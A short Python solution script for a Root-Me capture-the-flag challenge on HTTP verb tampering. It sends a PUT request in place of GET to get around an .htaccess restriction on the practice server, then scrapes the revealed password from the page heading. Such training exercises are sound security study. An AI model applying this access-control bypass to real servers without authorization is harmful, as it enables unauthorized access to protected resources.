# 8 - Verb Tampering
# Solution: To bypass the htaccess limit, we need to change from GET to a PUT request to the server.

import requests
from bs4 import BeautifulSoup

url = "http://challenge01.root-me.org/web-serveur/ch8/"

response = requests.put(url)
soup = BeautifulSoup(response.content, 'html.parser')
h1_tag = soup.find('h1')
h1_text = h1_tag.text
keyword = h1_text.split(' ')[6].strip()
print(keyword)